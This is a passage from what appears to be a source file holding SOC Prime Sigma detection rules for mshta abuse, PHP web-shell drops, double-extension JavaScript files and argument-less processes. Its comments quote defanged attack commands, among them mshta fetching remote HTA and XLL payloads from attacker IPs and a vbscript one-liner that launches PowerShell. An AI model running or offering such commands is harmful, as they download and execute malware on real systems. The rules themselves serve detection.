author: SOC Prime Team
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1218.005
    - attack.t1204.004
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent_image:
        ParentImage|endswith: 'mshta.exe'
    selection_image:
        Image|endswith: 'mshta.exe'
    selection_cmdline:
        - CommandLine|endswith:
            - '.hta' # malicious HTA in %TEMP% https://asec.ahnlab.com/en/96295/; mshta.exe hXXps://secfileshare[.]com/4.hta; https://cert.gov.ua/article/6284949; https://cert.gov.ua/article/6286219; https://isc.sans.edu/diary/32796; https://cert.gov.ua/article/6288271; https://blog.synapticsystems.de/uac-0184-from-hta-to-a-signed-network-stack/; https://asec.ahnlab.com/en/93855/; https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/; https://asec.ahnlab.com/en/94552/; https://asec.ahnlab.com/en/95171/; https://www.hudsonrock.com/blog/hbo-max-ads-on-a-compromised-reddit-account-exposed-a-massive-pasteswitch-clickfix-operation; https://www.trellix.com/blogs/research/sidecopy-threat-intel-mshta-execution-rat-deployment/; https://www.malware-traffic-analysis.net/2026/09/15/index.html; https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/
            - '.xll' #mshta hxxp://80.64[.]30.238/evil.xll; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
            - '.mp4' #mshta hxxp://80.64[.]30.238/evil.mp4; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
            - '.mp3' #mshta hxxp://80.64[.]30.238/evil.mp3; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
            - '.wav' #mshta hxxp://80.64[.]30.238/evil.wav; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
            - '.dat' #mshta hxxp://80.64[.]30.238/evil.dat; https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/
            - '.odd' #mshta hxxp://23.254.243[.]4/pjdl.odd; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/
        - CommandLine|contains:
            - '\\'
            - 'wscript'
            - 'CreateObject'
            - 'ActiveXObject'
            - 'vbscript' #mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';...; https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows
            - 'javascript' #https://www.magicsword.io/blog/apple-ios-certificate-windows-malware ; https://blogs.jpcert.or.jp/en/2026/07/apt-c-60_2026.html
            - 'http' #https://cert.gov.ua/article/6284949 mshta.exe hXXps://secfileshare[.]com/4.hta; https://www.zscaler.com/blogs/security-research/apt37-targets-windows-rust-backdoor-and-python-loader; https://cert.gov.ua/article/6286219; https://cloud.google.com/blog/topics/threat-intelligence/unc1069-targets-cryptocurrency-ai-social-engineering/; https://www.trendmicro.com/en_us/research/26/e/installfix-and-claude-code.html ;https://blog.synapticsystems.de/uac-0247-malware-targeting-fpv-operators/; https://isc.sans.edu/diary/rss/33018; https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/; https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/; https://www.netskope.com/jp/blog/malware-on-the-blockchain-an-ongoing-campaigns-new-webrtc-twist; https://www.cyderes.com/howler-cell/job-offer-attack-chains-analysis
            - 'close' #https://www.mcafee.com/blogs/other-blogs/mcafee-labs/astaroth-banking-trojan-abusing-github-for-resilience/
            - 'DavWWWRoot' #mshta \\dbexport.zip\DavWWWRoot\calc_hta.hta
    filters_chain1:
        ParentImage|endswith: 'TeamViewer.exe' #"C:\Windows\system32\mshta.exe" C:\Users\xxx\AppData\Local\Temp\TeamViewer\TeamViewer11_Exit.hta
        CommandLine|contains|all:
            - '\TeamViewer'
            - '_Exit.hta'
    condition: ((selection_image and selection_cmdline) and not filters_chain1) or selection_parent_image
falsepositives:
    - unknown
level: high
"#,
  // Possible Web Shell Drop - PHP Script or Web Config File Written by PHP Web Worker [Windows] (via file_event)
  "e7e64200-04ba-479a-9a51-c614bd74c4fb": r#"title: Possible Web Shell Drop - PHP Script or Web Config File Written by PHP Web Worker [Windows] (via file_event)
id: e7e64200-04ba-479a-9a51-c614bd74c4fb
status: stable
description: Detects a PHP web worker (php-cgi.exe, httpd.exe) writing PHP scripts, .htaccess or .user.ini files. After PHP2Shell remote code execution, attackers drop web shells or set auto_prepend_file in .user.ini for persistence.
author: SOC Prime Team
references:
    - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
tags:
    - attack.persistence
    - attack.t1505.003
logsource:
    product: windows
    category: file_event
detection:
    selection_image:
        Image|endswith:
            - '\php-cgi.exe'
            - '\httpd.exe'
    selection_target:
        TargetFilename|endswith:
            - '.php5'
            - '.php7'
            - '.php'
            - '.phtml'
            - '.phar'
            - '.pht'
            - '\.user.ini'
            - '\.htaccess'
    filters:
        TargetFilename|contains:
            - '\wp-content\cache'
            - '\wp-content\upgrade'
            - '\bootstrap' # Laravel
            - '\var\cache'
    condition: selection_image and selection_target and not filters
falsepositives:
    - CMS plugin / theme installation and auto-updates via web UI
    - Template engines compiling PHP cache files outside filtered paths
level: medium
"#,
  // Possible Malicious JS File with Double Extension (via cmdline)
  "e943e0d4-84be-43ef-ae7b-0292a9840589": r#"title: Possible Malicious JS File with Double Extension (via cmdline)
id: e943e0d4-84be-43ef-ae7b-0292a9840589
status: stable
description: Detects suspicious use of an .js extension.
author: SOC Prime Team
references:
    - https://cert.gov.ua/article/6032734
    - https://cert.gov.ua/article/5269451
    - https://www.resecurity.com/blog/article/the-new-version-of-jsoutprox-is-attacking-financial-institutions-in-apac-and-mena-via-gitlab-abuse
    - https://www.cloudsek.com/blog/getsmoked-uac-0006-returns-with-smokeloader-targeting-ukraines-largest-state-owned-bank
    - https://any.run/cybersecurity-blog/xworm-latam-campaign/
tags:
    - attack.defense_evasion
    - attack.t1036.007
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|contains: '.'
        CommandLine|contains:
            - '.doc.js'
            - '.docx.js'
            - '.xls.js'
            - '.xlsx.js'
            - '.ppt.js'
            - '.pptx.js'
            - '.rtf.js'
            - '.pdf.js' #Ahmad_Aldhefairi_Visa_Appeal_Letter_PDF.pdf; https://cert.gov.ua/article/6282902
            - '.txt.js'
            - '.jpg.js' #photo_15.09.24_JPG.js; https://cert.gov.ua/article/6282902
            - '.gif.js'
            - '.png.js'
            - '.zip.js'
            - '.7z.js'
            - '.dat.js'
    filters:
        CommandLine|contains:
            - 'PDF.js viewer'
    condition: selection and not filters
falsepositives:
    - none
level: high
"#,
  // Suspicious Process without Arguments (via cmdline)
  "ebeae962-2bc6-437b-adaa-dca7f3aed43d": r#"title: Suspicious Process without Arguments (via cmdline)
id: ebeae962-2bc6-437b-adaa-dca7f3aed43d
status: stable
description: Process executions without command-line options may indicate they are targets of Process Injection.
references:
    - https://cert.gov.ua/article/6282536
    - https://any.run/cybersecurity-blog/psloramyra-malware-technical-analysis/
    - https://unit42.paloaltonetworks.com/threat-assessment-blacksuit-ransomware-ignoble-scorpius/
    - https://resource.redcanary.com/rs/003-YRU-314/images/2021-Threat-Detection-Report.pdf
    - https://www.cloudsek.com/blog/silver-fox-targeting-india-using-tax-themed-phishing-lures
    - https://www.cloudsek.com/blog/reborn-in-rust-muddywater-evolves-tooling-with-rustywater-implant
author: SOC Prime Team
tags:
    - attack.defense_evasion
    - attack.t1055.012
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '.exe'
            - '.com'
            - '.scr'
            - '.tmp'
        CommandLine|endswith:
            - '\RegAsm.exe"'
            - '\RegAsm.exe"'
            - '\RegSvcs.exe' #C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe
            - '\RegSvcs.exe"' #"C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe"
            - '\regsvr32.exe"'
            - '\regsvr32.exe'
            - '\rundll32.exe"'
            - '\rundll32.exe'
            - '\svchost.exe"'
            - '\svchost.exe'
            - 'wefault.exe"'
            - 'wefault.exe'
    filters:
        - ParentImage|endswith:
            - 'MsMpEng.exe'
            - 'MRT.exe'
            - 'setup.exe'
            - 'sfc.exe' #"C:\Program Files\Cisco\AMP\8.2.1.21650\sfc.exe"
    condition: selection and not filters
falsepositives:
    - Unknown
level: medium
